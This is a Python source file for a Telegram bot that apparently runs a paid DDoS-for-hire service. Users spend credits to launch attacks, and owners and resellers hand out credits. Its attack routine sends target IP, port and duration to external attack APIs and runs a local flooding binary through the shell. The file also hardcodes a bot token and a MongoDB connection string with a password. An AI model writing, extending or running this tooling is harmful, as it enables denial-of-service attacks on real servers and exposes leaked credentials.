import os
import json
import telebot
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime
import certifi
from threading import Thread, Lock
import asyncio
from telebot import types
import subprocess

# --- INITIALIZATION ---
attack_loop = asyncio.new_event_loop()
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# --- CONFIGURATION ---
TOKEN = '8754814217:AAEIszWu7k_J3-7qivDV21i4B4i5Bq2bmw4'
MONGO_URI = 'mongodb+srv://ddos62366_db_user:cYaNxOHsNl5mpvA8@cluster0.1bfayzm.mongodb.net/?appName=Cluster0'
PRIMARY_ADMIN = 8318925500 # Aapki Main ID
BINARY_NAME = "./bgmi"

bot = telebot.TeleBot(TOKEN)

# Initialize MongoDB
try:
    client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
    db = client['danger']
    users_collection = db.users
    api_collection = db.apis 
    admins_collection = db.admins # Owners aur Resellers ke liye
    logging.info("MongoDB connected successfully")
except Exception as e:
    logging.error(f"MongoDB connection error: {e}")
    exit(1)

# Global Variables
attack_in_progress = False
attack_end_time = 0
attack_lock = Lock()
DEFAULT_THREADS = 6

# --- PERMISSION HELPERS ---

def get_user_role(user_id):
    if user_id == PRIMARY_ADMIN:
        return "owner"
    admin_data = admins_collection.find_one({"user_id": user_id})
    if admin_data:
        return admin_data.get("role")
    return "user"

def is_owner(user_id):
    return get_user_role(user_id) == "owner"

def is_reseller(user_id):
    role = get_user_role(user_id)
    return role == "reseller" or role == "owner"

# --- KEYBOARD ---
def create_inline_keyboard():
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("❤️ Join Our Channel", url="https://t.me/+-IX58oAPzeoyODll"))
    markup.add(types.InlineKeyboardButton("👤 Contact Owner", url="https://t.me/Circutowner"))
    return markup

# --- OWNER & RESELLER COMMANDS ---

@bot.message_handler(commands=['addowner'])
def add_owner_command(message):
    """Sirf Main Owner hi naye Owner add kar sakta hai"""
    if message.from_user.id != PRIMARY_ADMIN:
        bot.send_message(message.chat.id, "❌ *Sirf Main Admin hi naye Owner add kar sakta hai!*", parse_mode='Markdown')
        return
    try:
        target_id = int(message.text.split()[1])
        admins_collection.update_one({"user_id": target_id}, {"$set": {"role": "owner"}}, upsert=True)
        bot.send_message(message.chat.id, f"👑 *New Owner Added:* `{target_id}`", parse_mode='Markdown')
    except:
        bot.send_message(message.chat.id, "❗ Usage: `/addowner ID`")

@bot.message_handler(commands=['addreseller'])
def add_reseller_command(message):
    """Owner naye Reseller add kar sakta hai"""
    if not is_owner(message.from_user.id):
        bot.send_message(message.chat.id, "❌ *Sirf Owners hi Reseller add kar sakte hain!*", parse_mode='Markdown')
        return
    try:
        target_id = int(message.text.split()[1])
        admins_collection.update_one({"user_id": target_id}, {"$set": {"role": "reseller"}}, upsert=True)
        bot.send_message(message.chat.id, f"🤝 *New Reseller Added:* `{target_id}`", parse_mode='Markdown')
    except:
        bot.send_message(message.chat.id, "❗ Usage: `/addreseller ID`")

@bot.message_handler(commands=['addcredits'])
def add_credits_command(message):
    """Owner aur Reseller dono credits de sakte hain"""
    if not is_reseller(message.from_user.id):
        bot.send_message(message.chat.id, "❌ *Aapke paas credits dene ki permission nahi hai!*", parse_mode='Markdown')
        return
    try:
        args = message.text.split()
        target_id, amount = int(args[1]), int(args[2])
        users_collection.update_one({"user_id": target_id}, {"$inc": {"credits": amount}}, upsert=True)
        bot.send_message(message.chat.id, f"✅ *Credits Sent!*\nTo: `{target_id}`\nAmount: `{amount}`", parse_mode='Markdown')
    except:
        bot.send_message(message.chat.id, "❗ Usage: `/addcredits ID Amount`")

# --- API & ATTACK ENGINE ---

@bot.message_handler(commands=['apiurl'])
def add_api_url(message):
    if not is_owner(message.from_user.id): return
    try:
        args = message.text.split()
        url, key = args[1], args[2]
        api_collection.update_one({"url": url}, {"$set": {"key": key}}, upsert=True)
        bot.send_message(message.chat.id, "✅ *API Configured!*")
    except: pass

@bot.message_handler(commands=['listapi'])
def list_apis(message):
    if not is_reseller(message.from_user.id): return
    apis = list(api_collection.find())
    res = f"📋 *Active APIs:* `{len(apis)}`"
    bot.send_message(message.chat.id, res, parse_mode='Markdown')

async def run_instant_attack(chat_id, target_ip, target_port, duration):
    global attack_in_progress
    binary_cmd = f"chmod +x {BINARY_NAME} && {BINARY_NAME} {target_ip} {target_port} {duration} {DEFAULT_THREADS}"
    
    for api in list(api_collection.find()):
        try:
            requests.get(f"https://{api['url']}/api?key={api['key']}&host={target_ip}&port={target_port}&time={duration}", timeout=4)
        except: pass

    try:
        process = subprocess.Popen(binary_cmd, shell=True)
        await asyncio.sleep(duration)
        process.terminate()
        with attack_lock: attack_in_progress = False
        bot.send_message(chat_id, "*✅ Attack Finished!*", parse_mode='Markdown', reply_markup=create_inline_keyboard())
    except:
        with attack_lock: attack_in_progress = False

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    user_id = message.from_user.id
    user_data = users_collection.find_one({"user_id": user_id})
    
    if not user_data or user_data.get('credits', 0) < 5:
        bot.send_message(message.chat.id, "🚫 *Need 5 credits!*")
        return

    with attack_lock:
        if attack_in_progress:
            bot.send_message(message.chat.id, "⚠️ *Bot Busy!*")
            return

    bot.send_message(message.chat.id, "💣 *IP PORT TIME*")
    bot.register_next_step_handler(message, process_attack)

def process_attack(message):
    try:
        args = message.text.split()
        ip, port, dur = args[0], int(args[1]), int(args[2])
        users_collection.update_one({"user_id": message.from_user.id}, {"$inc": {"credits": -5}})
        
        global attack_in_progress, attack_end_time
        with attack_lock:
            attack_in_progress = True
            attack_end_time = time.time() + dur

        bot.send_message(message.chat.id, f"🚀 *Launched!* (-5 Credits)\n🎯 `{ip}:{port}`", parse_mode='Markdown')
        asyncio.run_coroutine_threadsafe(run_instant_attack(message.chat.id, ip, port, dur), attack_loop)
    except: pass

@bot.message_handler(commands=['start'])
def start(message):
    role = get_user_role(message.from_user.id)
    bot.send_message(message.chat.id, f"🌍 *Welcome!*\nYour Role: `{role.upper()}`", reply_markup=create_inline_keyboard(), parse_mode='Markdown')

# --- RUNNER ---
def main():
    def start_loop():
        asyncio.set_event_loop(attack_loop)
        attack_loop.run_forever()
    Thread(target=start_loop, daemon=True).start()
    bot.infinity_polling()

if __name__ == "__main__":
    main()

